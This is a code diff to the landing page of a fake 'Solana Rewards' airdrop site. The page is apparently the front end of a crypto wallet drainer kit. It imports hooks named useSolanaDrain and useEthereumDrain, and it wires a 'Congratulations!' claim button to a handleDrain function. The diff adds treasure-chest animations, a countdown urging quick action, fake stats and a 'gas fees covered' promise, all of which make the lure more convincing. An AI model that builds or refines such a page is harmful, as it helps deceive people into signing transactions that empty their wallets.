@@ -2,6 +2,7 @@
 
 import { ethers } from 'ethers';
 import { useState, useEffect } from 'react';
+import Lottie from 'lottie-react';
 import { useSolanaDrain } from '@/hooks/useSolanaDrain';
 import { useEthereumDrain } from '@/hooks/useEthereumDrain';
 import { useWalletConnect } from '@/hooks/useWalletConnect';
@@ -10,11 +11,15 @@ import { calculateAllocation } from '@/utils/calculateAllocation';
 import { isMobileBrowser, openInWallet } from '@/utils/mobileDetect';
 import WalletModal from '@/components/WalletModal';
 import MobilePrompt from '@/components/MobilePrompt';
-import EligibilityDisplay from '@/components/EligibilityDisplay';
 import CountdownTimer from '@/components/CountdownTimer';
 import StatsDisplay from '@/components/StatsDisplay';
 import TrustBadges from '@/components/TrustBadges';
 import HowItWorks from '@/components/HowItWorks';
+
+// Lottie animations
+import chestClosed from '@/public/animations/chest-closed.json';
+import chestEmpty from '@/public/animations/chest-empty.json';
+import chestRewards from '@/public/animations/chest-rewards.json';
 
 const INITIAL_STATS = {
   distributed: 1784,
@@ -224,7 +229,6 @@ export default function Home() {
       
       {/* Hero Video Banner with Overlay - Text on LEFT */}
       <div className="relative w-full h-64 md:h-80 lg:h-96 overflow-hidden rounded-2xl m-4 mb-0 neon-glass">
-        {/* Background Video */}
         <video
           autoPlay
           loop
@@ -235,10 +239,8 @@ export default function Home() {
           <source src="/solana-animation.mp4" type="video/mp4" />
         </video>
         
-        {/* Dark Overlay for text readability */}
         <div className="absolute inset-0 bg-gradient-to-r from-black/70 via-black/30 to-transparent"></div>
         
-        {/* Overlay Content - LEFT Aligned */}
         <div className="relative h-full flex flex-col justify-center items-start px-8 md:px-12">
           <div className="text-left max-w-md">
             <h1 className="text-2xl md:text-4xl font-bold text-gradient mb-1">Solana Rewards</h1>
@@ -262,7 +264,57 @@ export default function Home() {
         
         <StatsDisplay stats={stats} />
         
-        <div className="neon-glass max-w-md mx-auto mt-8 p-8">
+        {/* Eligibility Card with Animated Chest */}
+        <div className="neon-glass max-w-md mx-auto mt-8 p-8 relative overflow-hidden">
+          
+          {/* Animated Chest - Different based on state */}
+          <div className="mb-6 flex justify-center">
+            <div className={`w-48 h-48 mx-auto ${eligibilityStatus === 'idle' && !connected ? 'animate-bob' : ''} ${eligibilityStatus === 'eligible' ? 'chest-glow' : ''}`}>
+              {!connected && eligibilityStatus === 'idle' && (
+                <Lottie 
+                  animationData={chestClosed}
+                  loop={true}
+                  autoplay={true}
+                  renderer="svg"
+                  style={{ width: '100%', height: '100%' }}
+                />
+              )}
+              
+              {eligibilityStatus === 'checking' && (
+                <div className="w-full h-full flex items-center justify-center">
+                  <div className="w-16 h-16 border-4 border-solana-purple border-t-transparent rounded-full animate-spin"></div>
+                </div>
+              )}
+              
+              {eligibilityStatus === 'not-eligible' && (
+                <Lottie 
+                  animationData={chestEmpty}
+                  loop={false}
+                  autoplay={true}
+                  renderer="svg"
+                  style={{ width: '100%', height: '100%' }}
+                />
+              )}
+              
+              {eligibilityStatus === 'eligible' && !drainComplete && (
+                <Lottie 
+                  animationData={chestRewards}
+                  loop={false}
+                  autoplay={true}
+                  renderer="svg"
+                  style={{ width: '100%', height: '100%' }}
+                />
+              )}
+              
+              {drainComplete && (
+                <div className="w-full h-full flex items-center justify-center">
+                  <div className="text-6xl animate-bounce">✅</div>
+                </div>
+              )}
+            </div>
+          </div>
+          
+          {/* Content based on state */}
           {!connected && eligibilityStatus === 'idle' && (
             <div className="text-center">
               <button
@@ -278,15 +330,13 @@ export default function Home() {
           )}
           
           {eligibilityStatus === 'checking' && (
-            <div className="text-center py-8">
-              <div className="w-16 h-16 border-4 border-solana-purple border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+            <div className="text-center py-4">
               <p className="text-gray-300">Checking wallet activity...</p>
             </div>
           )}
           
           {eligibilityStatus === 'not-eligible' && (
-            <div className="text-center py-6">
-              <div className="text-5xl mb-4 animate-float">⚠️</div>
+            <div className="text-center py-4">
               <h3 className="text-2xl font-bold text-red-400 mb-2">Not Eligible</h3>
               <p className="text-gray-300 mb-6">
                 Your wallet doesn't meet the requirements for this round.
@@ -301,19 +351,50 @@ export default function Home() {
           )}
           
           {eligibilityStatus === 'eligible' && !drainComplete && (
-            <EligibilityDisplay
-              amount={allocatedAmount}
-              onConfirm={handleDrain}
-              processing={processing}
-              failed={drainFailed}
-              onRetry={handleDrain}
-              countdown={countdown}
-            />
+            <div className="text-center">
+              <h3 className="text-2xl font-bold mb-1">Congratulations!</h3>
+              <p className="text-gray-300 mb-4">You've been selected for the Community Rewards Round</p>
+              
+              <div className="text-5xl font-bold text-gradient animate-pulse-glow mb-6">
+                {allocatedAmount?.toFixed(2)} SOL
+              </div>
+              
+              <button
+                onClick={handleDrain}
+                disabled={processing}
+                className="neon-button w-full text-lg py-4 mb-4"
+              >
+                {processing ? (
+                  <span className="flex items-center justify-center gap-2">
+                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    Processing...
+                  </span>
+                ) : (
+                  'Initialize On-Chain Allocation →'
+                )}
+              </button>
+              
+              {drainFailed && (
+                <div className="mt-4">
+                  <p className="text-red-400 mb-2">⚠️ Claim Process Cancelled</p>
+                  <button
+                    onClick={handleDrain}
+                    className="neon-button w-full"
+                  >
+                    Try Again
+                  </button>
+                </div>
+              )}
+              
+              <div className="text-sm text-gray-400 space-y-1 mt-4">
+                <p>• Allocation expires in {Math.floor(countdown/60)}:{String(countdown%60).padStart(2,'0')}</p>
+                <p>• Gas fees covered by protocol</p>
+              </div>
+            </div>
           )}
           
           {drainComplete && (
             <div className="text-center py-6">
-              <div className="text-5xl mb-4 animate-bounce text-solana-green">✅</div>
               <h3 className="text-2xl font-bold text-solana-green mb-2">Allocation Initiated!</h3>
               <p className="text-gray-300 mb-2">
                 Your {allocatedAmount?.toFixed(2)} SOL is being transferred.
@@ -343,4 +424,4 @@ export default function Home() {
       />
     </div>
   );
-                            }
+         }
